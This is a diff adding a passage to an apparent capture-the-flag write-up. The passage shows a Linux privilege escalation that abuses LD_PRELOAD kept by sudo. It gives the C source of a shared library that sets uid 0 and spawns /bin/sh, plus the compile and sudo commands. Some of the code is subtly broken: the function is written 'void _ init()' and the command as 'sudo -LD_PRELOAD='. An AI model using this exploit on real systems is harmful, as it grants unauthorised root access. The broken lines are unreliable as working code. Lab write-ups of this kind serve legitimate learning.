@@ -182,5 +182,40 @@ I then used this to check his permissions with sudo -l:
 
 ![sudo -l](https://github.com/user-attachments/assets/4ee9f2b4-f85e-47e5-875e-dc7c0a54c36e)
 
+I noticed the env_keep += LD_PRELOAD which is an environment variable that we can exploit. A google search brought me to this article:
+
+https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
+
+From the article: "LD_Preload: It is an environment variable that lists shared libraries with functions that override the standard set, just as /etc/ld.so.preload does. These are implemented by the loader /lib/ld-linux.so"
+
+The article explains the process and demontrates the exploite:
+First, cd /tmp
+Then write a C program file:
+```bash
+vim shell.c
+```
+```bash
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _ init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+}
+```
+Then compile:
+```bash
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+```bash
+ls -al shell.so
+```
+Then run the ping command with new shared object libary to execute /bin/sh with root privileges:
+```bash
+sudo -LD_PRELOAD=/tmp/shell.so ping
+```
 
 
